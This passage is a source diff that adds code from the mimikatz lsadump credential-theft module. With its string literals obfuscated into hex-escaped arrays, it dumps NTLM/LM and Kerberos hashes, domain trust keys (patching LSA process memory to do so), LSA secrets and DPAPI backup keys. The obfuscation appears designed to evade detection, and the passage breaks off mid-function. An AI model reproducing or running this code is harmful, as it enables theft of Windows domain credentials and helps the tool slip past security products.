+const wchar_t  hid_K_e_r__cQjKMmpbF5UJ[] = {'\x4b','\x65','\x72','\x62','\x65','\x72','\x6f','\x73',0};
+
+const wchar_t  hid_K_e_r__XI7SykKz2qXY[] = {'\x4b','\x65','\x72','\x62','\x65','\x72','\x6f','\x73','\x2d','\x4e','\x65','\x77','\x65','\x72','\x2d','\x4b','\x65','\x79','\x73',0};
+
+const wchar_t  hid_N_T_L__Yet3IqRdG4so[] = {'\x4e','\x54','\x4c','\x4d','\x2d','\x53','\x74','\x72','\x6f','\x6e','\x67','\x2d','\x4e','\x54','\x4f','\x57','\x46',0};
+PCWCHAR KUHL_M_LSADUMP_SAMRPC_SUPPCRED_TYPE[] = {hid_P_r_i__71MzXUZ1XqUQ, hid_C_L_E__vGwv79GJ6ZHn, hid_W_D_i__U09ofwpwlz91, hid_K_e_r__cQjKMmpbF5UJ, hid_K_e_r__XI7SykKz2qXY, hid_N_T_L__Yet3IqRdG4so};
+void kuhl_m_lsadump_lsa_DescrBuffer(DWORD type, DWORD rid, PVOID Buffer, DWORD BufferSize)
+{
+	
+	 wchar_t  hid________4Rf6LLeupGRs[] = {'\n','\x20','\x2a','\x20','\x25','\x73','\n',0};
+
+	 wchar_t  hid________APQxB5kGHN3S[] = {'\x20','\x20','\x20','\x20','\x4e','\x54','\x4c','\x4d','\x20','\x3a','\x20',0};
+
+	 wchar_t  hid________Cd0oP8okLJRD[] = {'\n','\x20','\x20','\x20','\x20','\x4c','\x4d','\x20','\x20','\x20','\x3a','\x20',0};
+
+	const wchar_t  hid_N_T_L__DsurpZpOPFuU[] = {'\x4e','\x54','\x4c','\x4d',0};
+
+	const wchar_t  hid_n_t_l__yj8mD4bTnyrl[] = {'\x6e','\x74','\x6c','\x6d',0};
+
+	const wchar_t  hid_L_M____djtgXrQcsTlU[] = {'\x4c','\x4d','\x20','\x20',0};
+
+	const wchar_t  hid_l_m____3DJrA8cbBPIR[] = {'\x6c','\x6d','\x20','\x20',0};
+
+	 wchar_t  hid________NcjdCRV4u0wn[] = {'\x20','\x20','\x20','\x20','\x25','\x2e','\x2a','\x73','\n',0};
+
+	 wchar_t  hid________1ZIdELXZ5Q9a[] = {'\x20','\x20','\x20','\x20','\x25','\x30','\x32','\x75','\x20','\x20',0};
+
+	 wchar_t  hid________nnhsxE011dJw[] = {'\x20','\x20','\x20','\x20','\x44','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x53','\x61','\x6c','\x74','\x20','\x3a','\x20','\x25','\x2e','\x2a','\x73','\n',0};
+
+	 wchar_t  hid_C_r_e__DkiQtXW9VDaF[] = {'\x43','\x72','\x65','\x64','\x65','\x6e','\x74','\x69','\x61','\x6c','\x73',0};
+
+	 wchar_t  hid_O_l_d__YMCR9WGm4aop[] = {'\x4f','\x6c','\x64','\x43','\x72','\x65','\x64','\x65','\x6e','\x74','\x69','\x61','\x6c','\x73',0};
+
+	 wchar_t  hid________kBzw5kcyd7KL[] = {'\x20','\x20','\x20','\x20','\x44','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x53','\x61','\x6c','\x74','\x20','\x3a','\x20','\x25','\x2e','\x2a','\x73','\n','\x20','\x20','\x20','\x20','\x44','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x49','\x74','\x65','\x72','\x61','\x74','\x69','\x6f','\x6e','\x73','\x20','\x3a','\x20','\x25','\x75','\n',0};
+
+	 wchar_t  hid_C_r_e__Pp10aGgEXwZl[] = {'\x43','\x72','\x65','\x64','\x65','\x6e','\x74','\x69','\x61','\x6c','\x73',0};
+
+	 wchar_t  hid_S_e_r__1rbbqlqJQbYd[] = {'\x53','\x65','\x72','\x76','\x69','\x63','\x65','\x43','\x72','\x65','\x64','\x65','\x6e','\x74','\x69','\x61','\x6c','\x73',0};
+
+	 wchar_t  hid_O_l_d__DTRpYYtTvVFO[] = {'\x4f','\x6c','\x64','\x43','\x72','\x65','\x64','\x65','\x6e','\x74','\x69','\x61','\x6c','\x73',0};
+
+	 wchar_t  hid_O_l_d__9N1MTh6wn5TN[] = {'\x4f','\x6c','\x64','\x65','\x72','\x43','\x72','\x65','\x64','\x65','\x6e','\x74','\x69','\x61','\x6c','\x73',0};
+
+	 wchar_t  hid________NzH4diHhyQt6[] = {'\x20','\x20','\x20','\x20','\x52','\x61','\x6e','\x64','\x6f','\x6d','\x20','\x56','\x61','\x6c','\x75','\x65','\x20','\x3a','\x20',0};
+DWORD i;
+	PWDIGEST_CREDENTIALS pWDigest;
+	PKERB_STORED_CREDENTIAL pKerb;
+	PKERB_KEY_DATA pKeyData;
+	PKERB_STORED_CREDENTIAL_NEW pKerbNew;
+	PKERB_KEY_DATA_NEW pKeyDataNew;
+	PKIWI_SAMPR_USER_INTERNAL42_INFORMATION pUserInfos;
+	PKIWI_LSA_PRIVATE_DATA pData;
+
+	kprintf(hid________4Rf6LLeupGRs, (type < ARRAYSIZE(KUHL_M_LSADUMP_SAMRPC_SUPPCRED_TYPE)) ? KUHL_M_LSADUMP_SAMRPC_SUPPCRED_TYPE[type] : L"unknown");
+	switch(type)
+	{
+	case 0:
+		pUserInfos = (PKIWI_SAMPR_USER_INTERNAL42_INFORMATION) Buffer;
+		kprintf(hid________APQxB5kGHN3S);
+		if(pUserInfos->Internal1.NtPasswordPresent)
+			kull_m_string_wprintf_hex(pUserInfos->Internal1.NTHash, LM_NTLM_HASH_LENGTH, 0);
+		kprintf(hid________Cd0oP8okLJRD);
+		if(pUserInfos->Internal1.LmPasswordPresent)
+			kull_m_string_wprintf_hex(pUserInfos->Internal1.LMHash, LM_NTLM_HASH_LENGTH, 0);
+		kprintf(L"\n");
+		if(pUserInfos->cbPrivate)
+		{
+			pData = (PKIWI_LSA_PRIVATE_DATA) pUserInfos->Private;
+			if(pData->NtLength)
+				kuhl_m_lsadump_dcsync_decrypt(pData->NtHash, LM_NTLM_HASH_LENGTH, rid, hid_N_T_L__DsurpZpOPFuU, FALSE);
+			if(pData->NtHistoryLength)
+				kuhl_m_lsadump_dcsync_decrypt(pData->Data, pData->NtHistoryLength, rid, hid_n_t_l__yj8mD4bTnyrl, TRUE);
+			if(pData->LmLength)
+				kuhl_m_lsadump_dcsync_decrypt(pData->LmHash, LM_NTLM_HASH_LENGTH, rid, hid_L_M____djtgXrQcsTlU, FALSE);
+			if(pData->LmHistoryLength)
+				kuhl_m_lsadump_dcsync_decrypt(pData->Data + pData->NtHistoryLength, pData->LmHistoryLength, rid, hid_l_m____3DJrA8cbBPIR, TRUE);
+		}
+		break;
+	case 1:
+		kprintf(hid________NcjdCRV4u0wn, BufferSize / sizeof(wchar_t), Buffer);
+		break;
+	case 2:
+		pWDigest = (PWDIGEST_CREDENTIALS) Buffer;
+		for(i = 0; i < pWDigest->NumberOfHashes; i++)
+		{
+			kprintf(hid________1ZIdELXZ5Q9a, i + 1);
+			kull_m_string_wprintf_hex(pWDigest->Hash[i], MD5_DIGEST_LENGTH, 0);
+			kprintf(L"\n");
+		}
+		break;
+	case 3:
+		pKerb = (PKERB_STORED_CREDENTIAL) Buffer;
+		kprintf(hid________nnhsxE011dJw, pKerb->DefaultSaltLength / sizeof(wchar_t), (PBYTE) pKerb + pKerb->DefaultSaltOffset);
+		pKeyData = (PKERB_KEY_DATA) ((PBYTE) pKerb + sizeof(KERB_STORED_CREDENTIAL));
+		pKeyData = kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->CredentialCount, hid_C_r_e__DkiQtXW9VDaF);
+		kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->OldCredentialCount, hid_O_l_d__YMCR9WGm4aop);
+		break;
+	case 4:
+		pKerbNew = (PKERB_STORED_CREDENTIAL_NEW) Buffer;
+		kprintf(hid________kBzw5kcyd7KL, pKerbNew->DefaultSaltLength / sizeof(wchar_t), (PBYTE) pKerbNew + pKerbNew->DefaultSaltOffset, pKerbNew->DefaultIterationCount);
+		pKeyDataNew = (PKERB_KEY_DATA_NEW) ((PBYTE) pKerbNew + sizeof(KERB_STORED_CREDENTIAL_NEW));
+		pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->CredentialCount, hid_C_r_e__Pp10aGgEXwZl);
+		pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->ServiceCredentialCount, hid_S_e_r__1rbbqlqJQbYd);
+		pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OldCredentialCount, hid_O_l_d__DTRpYYtTvVFO);
+		kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OlderCredentialCount, hid_O_l_d__9N1MTh6wn5TN);
+		break;
+	case 5:
+		kprintf(hid________NzH4diHhyQt6);
+		kull_m_string_wprintf_hex(Buffer, BufferSize, 0);
+		kprintf(L"\n");
+		break;
+	default:
+		kull_m_string_wprintf_hex(Buffer, BufferSize, 1);
+		kprintf(L"\n");
+	}
+}
+
+PKERB_KEY_DATA kuhl_m_lsadump_lsa_keyDataInfo(PVOID base, PKERB_KEY_DATA keys, USHORT Count, PCWSTR title)
+{
+	
+	 wchar_t  hid________QbbPOw47JsWP[] = {'\x20','\x20','\x20','\x20','\x25','\x73','\n',0};
+
+	 wchar_t  hid________BsyM0GScgi1W[] = {'\x20','\x20','\x20','\x20','\x20','\x20','\x25','\x73','\x20','\x3a','\x20',0};
+USHORT i;
+	if(Count)
+	{
+		if(title)
+			kprintf(hid________QbbPOw47JsWP, title);
+		for(i = 0; i < Count; i++)
+		{
+			kprintf(hid________BsyM0GScgi1W, kuhl_m_kerberos_ticket_etype(keys[i].KeyType));
+			kull_m_string_wprintf_hex((PBYTE) base + keys[i].KeyOffset, keys[i].KeyLength, 0);
+			kprintf(L"\n");
+		}
+	}
+	return (PKERB_KEY_DATA) ((PBYTE) keys + Count * sizeof(KERB_KEY_DATA));
+}
+
+PKERB_KEY_DATA_NEW kuhl_m_lsadump_lsa_keyDataNewInfo(PVOID base, PKERB_KEY_DATA_NEW keys, USHORT Count, PCWSTR title)
+{
+	
+	 wchar_t  hid________teYhvikeaVcQ[] = {'\x20','\x20','\x20','\x20','\x25','\x73','\n',0};
+
+	 wchar_t  hid________33OENFTyQHxk[] = {'\x20','\x20','\x20','\x20','\x20','\x20','\x25','\x73','\x20','\x28','\x25','\x75','\x29','\x20','\x3a','\x20',0};
+USHORT i;
+	if(Count)
+	{
+		if(title)
+			kprintf(hid________teYhvikeaVcQ, title);
+		for(i = 0; i < Count; i++)
+		{
+			kprintf(hid________33OENFTyQHxk, kuhl_m_kerberos_ticket_etype(keys[i].KeyType), keys->IterationCount);
+			kull_m_string_wprintf_hex((PBYTE) base + keys[i].KeyOffset, keys[i].KeyLength, 0);
+			kprintf(L"\n");
+		}
+	}
+	return (PKERB_KEY_DATA_NEW) ((PBYTE) keys + Count * sizeof(KERB_KEY_DATA_NEW));
+}
+
+
+const wchar_t  hid_N_O_N__NJOv4IKC4R9z[] = {'\x4e','\x4f','\x4e','\x45','\x20','\x20','\x20',0};
+
+const wchar_t  hid_N_T____VtfXkq0S3Bu7[] = {'\x4e','\x54','\x34','\x4f','\x57','\x46','\x20',0};
+
+const wchar_t  hid_C_L_E__4staIcx6LLcO[] = {'\x43','\x4c','\x45','\x41','\x52','\x20','\x20',0};
+
+const wchar_t  hid_V_E_R__kpJeSAHoZKVY[] = {'\x56','\x45','\x52','\x53','\x49','\x4f','\x4e',0};
+const wchar_t * TRUST_AUTH_TYPE[] = {
+	hid_N_O_N__NJOv4IKC4R9z,
+	hid_N_T____VtfXkq0S3Bu7,
+	hid_C_L_E__4staIcx6LLcO,
+	hid_V_E_R__kpJeSAHoZKVY,
+};
+DECLARE_UNICODE_STRING(uKrbtgt, L"krbtgt");
+void kuhl_m_lsadump_trust_authinformation(PLSA_AUTH_INFORMATION info, DWORD count, PNTDS_LSA_AUTH_INFORMATION infoNtds, PCWSTR prefix, PCUNICODE_STRING from, PCUNICODE_STRING dest)
+{
+	
+	 wchar_t  hid________XaTu6WFdpfLb[] = {'\x20','\x5b','\x25','\x73','\x5d','\x20','\x25','\x77','\x5a','\x20','\x2d','\x3e','\x20','\x25','\x77','\x5a','\n',0};
+
+	 wchar_t  hid________PY3UQfxQPoaP[] = {'\x20','\x20','\x20','\x20','\x2a','\x20',0};
+
+	 wchar_t  hid________STv1Oni0zvYC[] = {'\x20','\x20','\x20','\x20','\x2a','\x20',0};
+DWORD i, j;
+	UNICODE_STRING dst, password;
+	LONG kerbType[] = {KERB_ETYPE_AES256_CTS_HMAC_SHA1_96, KERB_ETYPE_AES128_CTS_HMAC_SHA1_96, KERB_ETYPE_RC4_HMAC_NT};
+
+	kprintf(hid________XaTu6WFdpfLb, prefix, from, dest);
+	if(info)
+	{
+		for(i = 0; i < count; i++)
+		{
+			kprintf(hid________PY3UQfxQPoaP); kull_m_string_displayLocalFileTime((PFILETIME) &info[i].LastUpdateTime);
+			kprintf((info[i].AuthType < ARRAYSIZE(TRUST_AUTH_TYPE)) ? L" - %s - " : L"- %u - ", (info[i].AuthType < ARRAYSIZE(TRUST_AUTH_TYPE)) ? TRUST_AUTH_TYPE[info[i].AuthType] : L"unknown?");
+			kull_m_string_wprintf_hex(info[i].AuthInfo, info[i].AuthInfoLength, 1); kprintf(L"\n");
+
+			if(info[i].AuthType == TRUST_AUTH_TYPE_CLEAR)
+			{
+				dst.Length = 0;
+				dst.MaximumLength = from->Length + uKrbtgt.Length + dest->Length;
+				if(dst.Buffer = (PWSTR) LocalAlloc(LPTR, dst.MaximumLength))
+				{
+					RtlAppendUnicodeStringToString(&dst, from);
+					RtlAppendUnicodeStringToString(&dst, &uKrbtgt);
+					RtlAppendUnicodeStringToString(&dst, dest);
+					password.Length = password.MaximumLength = (USHORT) info[i].AuthInfoLength;
+					password.Buffer = (PWSTR) info[i].AuthInfo;
+					for(j = 0; j < ARRAYSIZE(kerbType); j++)
+						kuhl_m_kerberos_hash_data(kerbType[j], &password, &dst, 4096);
+					LocalFree(dst.Buffer);
+				}
+			}
+		}
+	}
+	else if(infoNtds)
+	{
+		kprintf(hid________STv1Oni0zvYC); kull_m_string_displayLocalFileTime((PFILETIME) &infoNtds->LastUpdateTime);
+		kprintf((infoNtds->AuthType < ARRAYSIZE(TRUST_AUTH_TYPE)) ? L" - %s - " : L"- %u - ", (infoNtds->AuthType < ARRAYSIZE(TRUST_AUTH_TYPE)) ? TRUST_AUTH_TYPE[infoNtds->AuthType] : L"unknown?");
+		kull_m_string_wprintf_hex(infoNtds->AuthInfo, infoNtds->AuthInfoLength, 1); kprintf(L"\n");
+
+		if(infoNtds->AuthType == TRUST_AUTH_TYPE_CLEAR)
+		{
+			dst.Length = 0;
+			dst.MaximumLength = from->Length + uKrbtgt.Length + dest->Length;
+			if(dst.Buffer = (PWSTR) LocalAlloc(LPTR, dst.MaximumLength))
+			{
+				RtlAppendUnicodeStringToString(&dst, from);
+				RtlAppendUnicodeStringToString(&dst, &uKrbtgt);
+				RtlAppendUnicodeStringToString(&dst, dest);
+				password.Length = password.MaximumLength = (USHORT) infoNtds->AuthInfoLength;
+				password.Buffer = (PWSTR) infoNtds->AuthInfo;
+				for(j = 0; j < ARRAYSIZE(kerbType); j++)
+					kuhl_m_kerberos_hash_data(kerbType[j], &password, &dst, 4096);
+				LocalFree(dst.Buffer);
+			}
+		}
+	}
+	kprintf(L"\n");
+}
+
+BYTE PATC_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xeb};
+#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
+BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xbb, 0x03, 0x00, 0x00, 0xc0, 0xe9};
+KULL_M_PATCH_GENERIC QueryInfoTrustedDomainReferences[] = {
+	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_LsaDbrQueryInfoTrustedDomain),	PTRN_WALL_LsaDbrQueryInfoTrustedDomain},	{sizeof(PATC_WALL_LsaDbrQueryInfoTrustedDomain),	PATC_WALL_LsaDbrQueryInfoTrustedDomain},	{-11}},
+};
+#elif defined(_M_IX86)
+BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xc7, 0x45, 0xfc, 0x03, 0x00, 0x00, 0xc0, 0xe9};
+KULL_M_PATCH_GENERIC QueryInfoTrustedDomainReferences[] = {
+	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_LsaDbrQueryInfoTrustedDomain),	PTRN_WALL_LsaDbrQueryInfoTrustedDomain},	{sizeof(PATC_WALL_LsaDbrQueryInfoTrustedDomain),	PATC_WALL_LsaDbrQueryInfoTrustedDomain},	{-10}},
+};
+#endif
+NTSTATUS kuhl_m_lsadump_trust(int argc, wchar_t * argv[])
+{
+	
+	 wchar_t  hid___C_u__qdag9frBiHMU[] = {'\n','\x43','\x75','\x72','\x72','\x65','\x6e','\x74','\x20','\x64','\x6f','\x6d','\x61','\x69','\x6e','\x3a','\x20','\x25','\x77','\x5a','\x20','\x28','\x25','\x77','\x5a',0};
+
+	 wchar_t  hid________XGrEOWRuIFT4[] = {'\x20','\x2f','\x20',0};
+
+	 wchar_t  hid___D_o__cAOBo9iwOVwo[] = {'\n','\x44','\x6f','\x6d','\x61','\x69','\x6e','\x3a','\x20','\x25','\x77','\x5a','\x20','\x28','\x25','\x77','\x5a',0};
+
+	 wchar_t  hid________L1oBT9zuyVBq[] = {'\x20','\x2f','\x20',0};
+
+	 wchar_t  hid_____I__hQKFQQdAMB9X[] = {'\x20','\x20','\x49','\x6e','\x20',0};
+
+	 wchar_t  hid___O_u__4eQXURWsw4Ue[] = {'\x20','\x4f','\x75','\x74','\x20',0};
+
+	 wchar_t  hid___I_n__8TdfHSlEq78b[] = {'\x20','\x49','\x6e','\x2d','\x31',0};
+
+	 wchar_t  hid_O_u_t__0xz4FBZRHuE9[] = {'\x4f','\x75','\x74','\x2d','\x31',0};
+LSA_HANDLE hLSA;
+	LSA_ENUMERATION_HANDLE hLSAEnum = 0;
+	LSA_OBJECT_ATTRIBUTES oaLsa = {0};
+	NTSTATUS statusEnum, status;
+	PPOLICY_DNS_DOMAIN_INFO pDomainInfo;
+	PTRUSTED_DOMAIN_INFORMATION_EX domainInfoEx;
+	PTRUSTED_DOMAIN_AUTH_INFORMATION authinfos = NULL;
+	DWORD i, returned;
+
+	PKULL_M_PATCH_GENERIC currentReference;
+	PKULL_M_MEMORY_HANDLE hMemory = NULL;
+	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModule;
+	KULL_M_MEMORY_ADDRESS aPatternMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aPatchMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
+	KULL_M_MEMORY_SEARCH sMemory;
+	LPCWSTR szSystem = NULL;
+	UNICODE_STRING uSystem;
+
+	static BOOL isPatching = FALSE;
+
+	if(kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL))
+		RtlInitUnicodeString(&uSystem, szSystem);
+
+	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
+	{
+		if(currentReference = kull_m_patch_getGenericFromBuild(QueryInfoTrustedDomainReferences, ARRAYSIZE(QueryInfoTrustedDomainReferences), MIMIKATZ_NT_BUILD_NUMBER))
+		{
+			aPatternMemory.address = currentReference->Search.Pattern;
+			aPatchMemory.address = currentReference->Patch.Pattern;
+
+			if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION))
+			{
+				if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"lsasrv.dll" : L"lsadb.dll", &iModule))
+				{
+					sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModule.DllBase;
+					sMemory.kull_m_memoryRange.size = iModule.SizeOfImage;
+					isPatching = TRUE;
+					if(!kull_m_patch(&sMemory, &aPatternMemory, currentReference->Search.Length, &aPatchMemory, currentReference->Patch.Length, currentReference->Offsets.off0, kuhl_m_lsadump_trust, argc, argv, NULL))
+						PRINT_ERROR_AUTO(L"kull_m_patch");
+					isPatching = FALSE;
+				}
+				else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
+			}
+		}
+	}
+	else
+	{
+		if(NT_SUCCESS(LsaOpenPolicy(szSystem ? &uSystem : NULL, &oaLsa, POLICY_VIEW_LOCAL_INFORMATION, &hLSA)))
+		{
+			status = LsaQueryInformationPolicy(hLSA, PolicyDnsDomainInformation, (PVOID *) &pDomainInfo);
+			if(NT_SUCCESS(status))
+			{
+				RtlUpcaseUnicodeString(&pDomainInfo->DnsDomainName, &pDomainInfo->DnsDomainName, FALSE);
+				kprintf(hid___C_u__qdag9frBiHMU, &pDomainInfo->DnsDomainName, &pDomainInfo->Name);
+				if(pDomainInfo->Sid)
+					kprintf(hid________XGrEOWRuIFT4); kull_m_string_displaySID(pDomainInfo->Sid);
+				kprintf(L")\n");
+
+				for(
+					hLSAEnum = 0, statusEnum = LsaEnumerateTrustedDomainsEx(hLSA, &hLSAEnum, (PVOID *) &domainInfoEx, 0, &returned);
+					returned && ((statusEnum == STATUS_SUCCESS) || (statusEnum == STATUS_MORE_ENTRIES));
+				statusEnum = LsaEnumerateTrustedDomainsEx(hLSA, &hLSAEnum, (PVOID *) &domainInfoEx, 0, &returned)
+					)
+				{
+					for(i = 0; i < returned; i++)
+					{
+						RtlUpcaseUnicodeString(&domainInfoEx[i].Name, &domainInfoEx[i].Name, FALSE);
+						kprintf(hid___D_o__cAOBo9iwOVwo, &domainInfoEx[i].Name, &domainInfoEx[i].FlatName);
+						if(domainInfoEx[i].Sid)
+							kprintf(hid________L1oBT9zuyVBq); kull_m_string_displaySID(domainInfoEx[i].Sid);
+						kprintf(L")\n");
+
+						status = LsaQueryTrustedDomainInfoByName(hLSA, &domainInfoEx[i].Name, TrustedDomainAuthInformation, (PVOID *) &authinfos);
+						if(NT_SUCCESS(status))
+						{
+							kuhl_m_lsadump_trust_authinformation(authinfos->IncomingAuthenticationInformation, authinfos->IncomingAuthInfos, NULL, hid_____I__hQKFQQdAMB9X, &pDomainInfo->DnsDomainName, &domainInfoEx[i].Name);
+							kuhl_m_lsadump_trust_authinformation(authinfos->OutgoingAuthenticationInformation, authinfos->OutgoingAuthInfos, NULL, hid___O_u__4eQXURWsw4Ue, &domainInfoEx[i].Name, &pDomainInfo->DnsDomainName);
+							kuhl_m_lsadump_trust_authinformation(authinfos->IncomingPreviousAuthenticationInformation, authinfos->IncomingAuthInfos, NULL, hid___I_n__8TdfHSlEq78b, &pDomainInfo->DnsDomainName, &domainInfoEx[i].Name);
+							kuhl_m_lsadump_trust_authinformation(authinfos->OutgoingPreviousAuthenticationInformation, authinfos->OutgoingAuthInfos, NULL, hid_O_u_t__0xz4FBZRHuE9, &domainInfoEx[i].Name, &pDomainInfo->DnsDomainName);
+							LsaFreeMemory(authinfos);
+						}
+						else PRINT_ERROR(L"LsaQueryTrustedDomainInfoByName %08x\n", status);
+					}
+					LsaFreeMemory(domainInfoEx);
+				}
+				if((statusEnum != STATUS_NO_MORE_ENTRIES) && (statusEnum != STATUS_SUCCESS))
+					PRINT_ERROR(L"LsaEnumerateTrustedDomainsEx %08x\n", statusEnum);
+
+				LsaFreeMemory(pDomainInfo);
+			}
+			LsaClose(hLSA);
+		}
+	}
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS kuhl_m_lsadump_LsaRetrievePrivateData(PCWSTR systemName, PCWSTR secretName, PUNICODE_STRING secret, BOOL isSecret)
+{
+	NTSTATUS status = STATUS_UNSUCCESSFUL;
+	LSA_OBJECT_ATTRIBUTES oa = {0};
+	LSA_HANDLE hPolicy, hSecret;
+	UNICODE_STRING name, system, *cur, *old;
+	LARGE_INTEGER curDate, oldDate;
+
+	if(secretName)
+	{
+		RtlInitUnicodeString(&name, secretName);
+		RtlInitUnicodeString(&system, systemName);
+		status = LsaOpenPolicy(&system, &oa, POLICY_GET_PRIVATE_INFORMATION, &hPolicy);
+		if(NT_SUCCESS(status))
+		{
+			if(!isSecret)
+			{
+				status = LsaRetrievePrivateData(hPolicy, &name, &cur);
+				if(NT_SUCCESS(status))
+				{
+					if(cur)
+					{
+						*secret = *cur;
+						if(secret->Buffer = (PWSTR) LocalAlloc(LPTR, secret->MaximumLength))
+							RtlCopyMemory(secret->Buffer, cur->Buffer, secret->MaximumLength);
+						LsaFreeMemory(cur);
+					}
+				}
+			}
+			else
+			{
+				status = LsaOpenSecret(hPolicy, &name, SECRET_QUERY_VALUE, &hSecret);
+				if(NT_SUCCESS(status))
+				{
+					status = LsaQuerySecret(hSecret, &cur, &curDate, &old, &oldDate);
+					if(NT_SUCCESS(status))
+					{
+						if(cur)
+						{
+							*secret = *cur;
+							if(secret->Buffer = (PWSTR) LocalAlloc(LPTR, secret->MaximumLength))
+								RtlCopyMemory(secret->Buffer, cur->Buffer, secret->MaximumLength);
+							LsaFreeMemory(cur);
+						}
+						if(old)
+							LsaFreeMemory(old);
+					}
+					LsaClose(hSecret);
+				}
+			}
+			LsaClose(hPolicy);
+		}
+	}
+	return status;
+}
+
+void kuhl_m_lsadump_analyzeKey(LPCGUID guid, PKIWI_BACKUP_KEY secret, DWORD size, BOOL isExport)
+{
+	
+	 wchar_t  hid________jxCFzdj02aII[] = {'\x20','\x20','\x2a','\x20','\x52','\x53','\x41','\x20','\x6b','\x65','\x79','\n',0};
+
+	const wchar_t  hid_n_t_d__f42coenCeAJe[] = {'\x6e','\x74','\x64','\x73',0};
+
+	const wchar_t  hid_n_t_d__rOQqUUa05j4I[] = {'\x6e','\x74','\x64','\x73',0};
+
+	const wchar_t  hid_c_a_p__GrTmJGXt3mBT[] = {'\x63','\x61','\x70','\x69',0};
+
+	const wchar_t  hid_p_f_x__e8MGHjI39A6R[] = {'\x70','\x66','\x78',0};
+
+	 wchar_t  hid___P_F__RWT8n86DgexB[] = {'\x9','\x50','\x46','\x58','\x20','\x63','\x6f','\x6e','\x74','\x61','\x69','\x6e','\x65','\x72','\x20','\x20','\x3a','\x20','\x25','\x73','\x20','\x2d','\x20','\'','\x25','\x73','\'','\n',0};
+
+	const wchar_t  hid_n_t_d__9zQanzVIhqNv[] = {'\x6e','\x74','\x64','\x73',0};
+
+	const wchar_t  hid_c_a_p__6ZeksHLyk9lU[] = {'\x63','\x61','\x70','\x69',0};
+
+	const wchar_t  hid_d_e_r__owuZVPSt71GZ[] = {'\x64','\x65','\x72',0};
+
+	 wchar_t  hid________DcCr8I3ZsQ2F[] = {'\x20','\x20','\x2a','\x20','\x4c','\x65','\x67','\x61','\x63','\x79','\x20','\x6b','\x65','\x79','\n',0};
+
+	const wchar_t  hid_n_t_d__IWwnrw51pJBg[] = {'\x6e','\x74','\x64','\x73',0};
+
+	const wchar_t  hid_l_e_g__bBztHPdnp1dI[] = {'\x6c','\x65','\x67','\x61','\x63','\x79',0};
+
+	const wchar_t  hid_k_e_y__qMjxcnNOpcxk[] = {'\x6b','\x65','\x79',0};
+
+	 wchar_t  hid________eHLPT3ahuFTx[] = {'\x20','\x20','\x2a','\x20','\x55','\x6e','\x6b','\x6e','\x6f','\x77','\x6e','\x20','\x6b','\x65','\x79','\x20','\x28','\x73','\x65','\x65','\x6e','\x20','\x61','\x73','\x20','\x25','\x30','\x38','\x78','\x29','\n',0};
+
+	const wchar_t  hid_n_t_d__QSU1erLNZG6e[] = {'\x6e','\x74','\x64','\x73',0};
+
+	const wchar_t  hid_u_n_k__Vtoc0IUb8V9E[] = {'\x75','\x6e','\x6b','\x6e','\x6f','\x77','\x6e',0};
+
+	const wchar_t  hid_k_e_y__yERMf1Pawj1L[] = {'\x6b','\x65','\x79',0};
+
+	 wchar_t  hid___E_x__LO3L79nfPCi8[] = {'\x9','\x45','\x78','\x70','\x6f','\x72','\x74','\x20','\x20','\x20','\x20','\x20','\x20','\x20','\x20','\x20','\x3a','\x20','\x25','\x73','\x20','\x2d','\x20','\'','\x25','\x73','\'','\n',0};
+PVOID data;
+	DWORD len;
+	UNICODE_STRING uString;
+	PWCHAR filename = NULL, shortname;
+
+	if(NT_SUCCESS(RtlStringFromGUID(guid, &uString)))
+	{
+		uString.Buffer[uString.Length / sizeof(wchar_t) - 1] = L'\0';
+		shortname = uString.Buffer + 1;
+		switch(secret->version)
+		{
+		case 2:
+			kprintf(hid________jxCFzdj02aII);
+			kuhl_m_dpapi_oe_domainkey_add(guid, secret->data, secret->keyLen, TRUE);
+			kuhl_m_crypto_exportRawKeyToFile(secret->data, secret->keyLen, FALSE, hid_n_t_d__f42coenCeAJe, 0, shortname, isExport, TRUE);
+			if(isExport)
+			{
+				data = secret->data + secret->keyLen;
+				len = secret->certLen;
+				if(filename = kuhl_m_crypto_generateFileName(hid_n_t_d__rOQqUUa05j4I, hid_c_a_p__GrTmJGXt3mBT, 0, shortname, hid_p_f_x__e8MGHjI39A6R))
+				{
+					kprintf(hid___P_F__RWT8n86DgexB, kull_m_crypto_DerAndKeyToPfx(data, len, secret->data, secret->keyLen, FALSE, filename) ? L"OK" : L"KO", filename);
+					LocalFree(filename);
+				}
+				filename = kuhl_m_crypto_generateFileName(hid_n_t_d__9zQanzVIhqNv, hid_c_a_p__6ZeksHLyk9lU, 0, shortname, hid_d_e_r__owuZVPSt71GZ);
+			}
+			break;
+		case 1:
+			kprintf(hid________DcCr8I3ZsQ2F);
